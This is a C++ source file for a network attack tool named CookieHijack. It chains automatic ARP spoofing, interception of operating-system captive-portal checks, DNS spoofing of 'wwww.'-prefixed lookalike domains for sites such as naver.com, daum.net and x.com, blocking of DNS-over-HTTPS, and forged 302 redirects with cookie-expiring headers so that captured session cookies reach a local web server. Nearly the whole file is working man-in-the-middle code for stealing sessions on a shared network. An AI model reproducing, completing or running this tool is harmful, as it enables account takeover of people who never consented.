#include "cookiehijack.h"

CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
	webServer_.setObjectName("webServer_");
	autoArpSpoof_.setObjectName("autoArpSpoof_");
	find_.setObjectName("find_");
	tcpBlock_.setObjectName("tcpBlock_");
	dnsBlock_.setObjectName("dnsBlock_");
	dnsBlockDnsServer_.setObjectName("dnsBlockDnsServer_");
	tcpFlowMgr_.setObjectName("tcpFlowMgr_");
	cookieHijack_.setObjectName("cookieHijack_");
	bpFilter_.setObjectName("bpFilter_");
	blockExternal_.setObjectName("blockExternal_");
	tcpBlockExternal_.setObjectName("tcpBlockExternal_");
	udpBlockExternal_.setObjectName("udpBlockExternal_");
	command_.setObjectName("command_");

	httpSiteList_.push_back("naver.com");
	httpSiteList_.push_back("daum.net");
	httpSiteList_.push_back("nate.com");
	httpSiteList_.push_back("jandi.com");
	httpSiteList_.push_back("11st.co.kr");
	httpSiteList_.push_back("wavve.com");
	httpSiteList_.push_back("nexon.com");
	httpSiteList_.push_back("op.gg");

	httpsSiteList_.push_back("x.com");

	prefix_ = "wwww";

#ifdef Q_OS_ANDROID
	firefoxDir_ = "/data/data/org.mozilla.firefox/files/mozilla";
#else //
	firefoxDir_ = QDir::homePath() +"/.mozilla/firefox";
#endif // Q_OS_ANDROID

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, this, &CookieHijack::hijack, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);

	// 40 : minimum value of ip header size + tcp header size
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /generate_204 HTTP/1.")); // Android
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /success.txt?ipv4 HTTP/1.")); // Firefox
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /connecttest.txt HTTP/1.")); // Windows
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /redirect HTTP/1.")); // Windows
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /hotspot-detect.html HTTP/1.")); // Apple

	tcpBlock_.forwardBlockType_ = GTcpBlock::Rst;
	tcpBlock_.backwardBlockType_ = GTcpBlock::Fin;

	cookieHijack_.tcpFlowMgr_ = &tcpFlowMgr_;

	dnsBlockDnsServer_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "chrome.cloudflare-dns.com", "127.4.4.4"));

	bpFilter_.filter_ = "!(tcp port 80 or udp port 53)";

	tcpBlockExternal_.forwardBlockType_ = GTcpBlock::Rst;
	tcpBlockExternal_.backwardBlockType_ = GTcpBlock::Rst;

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &find_, &GFind::find, Qt::DirectConnection);
	QObject::connect(&find_, &GFind::found, &tcpBlock_, &GTcpBlock::block, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);
	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlockDnsServer_, &GDnsBlock::block, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &tcpFlowMgr_, &GTcpFlowMgr::manage, Qt::DirectConnection);
	QObject::connect(&tcpFlowMgr_, &GTcpFlowMgr::managed, &cookieHijack_, &GCookieHijack::hijack, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &bpFilter_, &GBpFilter::filter, Qt::DirectConnection);
	QObject::connect(&bpFilter_, &GBpFilter::filtered, &blockExternal_, &GBlock::block, Qt::DirectConnection);
	QObject::connect(&bpFilter_, &GBpFilter::filtered, &tcpBlockExternal_, &GTcpBlock::block, Qt::DirectConnection);
	QObject::connect(&bpFilter_, &GBpFilter::filtered, &udpBlockExternal_, &GUdpBlock::block, Qt::DirectConnection);

	QObject::connect(&cookieHijack_, &GCookieHijack::hijacked, &webServer_, &WebServer::doHijacked);

	nodes_.append(&webServer_);
	nodes_.append(&autoArpSpoof_);
	nodes_.append(&find_);
	nodes_.append(&tcpBlock_);
	nodes_.append(&dnsBlock_);
	nodes_.append(&dnsBlockDnsServer_);
	nodes_.append(&tcpFlowMgr_);
	nodes_.append(&cookieHijack_);
	nodes_.append(&bpFilter_);
	nodes_.append(&blockExternal_);
	nodes_.append(&tcpBlockExternal_);
	nodes_.append(&udpBlockExternal_);
}

CookieHijack::~CookieHijack() {
	close();
}

bool CookieHijack::doOpen() {
	QString intfName = autoArpSpoof_.intfName_;
	GIntf* intf = GNetInfo::instance().intfList().findByName(intfName);
	if (intf == nullptr) {
		QString msg = QString("can not find interface for %1").arg(intfName);
		SET_ERR(GErr::ValueIsNull, msg);
		return false;
	}

	totalSiteList_.clear();
	for (QString site: httpSiteList_)
		if (site.trimmed() != "") totalSiteList_.push_back({site.trimmed(), false});
	for (QString site: httpsSiteList_)
		if (site.trimmed() != "") totalSiteList_.push_back({site.trimmed(), true});

	if (totalSiteList_.size() == 0) {
		SET_ERR(GErr::ValueIsZero, "site list must have at least one site");
		return false;
	}

	tcpBlock_.backwardFinMsg_ = getHttpResponse(0, QString());

	dnsBlock_.dnsBlockItems_.clear();
	if (prefix_ != "") {
		dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(intf->ip())));
		dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "_*", QString(intf->ip()))); // _4433._https.wwww.naver.com
	}

	bool res = GGraph::doOpen();
	if (!res) return false;

	return true;
}

bool CookieHijack::doClose() {
	bool res = GGraph::doClose();

	return res;
}

QStringList CookieHijack::getHttpResponse(int siteNo, QString cookie) {
	if (siteNo >= totalSiteList_.size())
		return QStringList();

	Site site = totalSiteList_.at(siteNo);

	QString scheme = site.ssl ? "https" : "http";
	QString status = QString("%1(%2)").arg(site.name).arg(site.ssl ? "ssl" : "tcp");

	QStringList res = QStringList{"HTTP/1.1 302 " + status};

	if (cookie.size() != 0) {
		QStringList cookies = cookie.split(';');
		for (QString oneCookie: cookies) {
			int i = oneCookie.indexOf('=');
			if (i == -1) {
				qWarning() << QString("Can not find '=' for cookie(%s)").arg(oneCookie);
				continue;
			}
			QString cookieName = oneCookie.left(i).trimmed();
			QString setCookieString = QString("Set-Cookie: %1=deleted; expires=Sat, 1-Jan-2000 16:01:17 GMT; path=/").arg(cookieName);
			res += setCookieString;
		}
	}

	QString locationStr;
	int port = site.ssl ? webServer_.httpsPort_ : webServer_.httpPort_;
	if (prefix_ == "")
		locationStr = QString("Location: %1://%2").arg(scheme).arg(site.name);
	else
		locationStr = QString("Location: %1://%2.%3").arg(scheme).arg(prefix_).arg(site.name);
	if (port != 80 && port != 443) locationStr += ":" + QString::number(port);
	locationStr += "/" + QString::number(siteNo) + "/" + site.name;
	res += locationStr;

	res += "Connection: close";
	res += "";
	res += "";

	return res;
}

void CookieHijack::hijack(GPacket* packet) {
	(void)packet; // gilgil temp 2024.08.08
}

void CookieHijack::propLoad(QJsonObject jo) {
	GProp::propLoad(jo);
}

void CookieHijack::propSave(QJsonObject& jo) {
	GProp::propSave(jo);
}
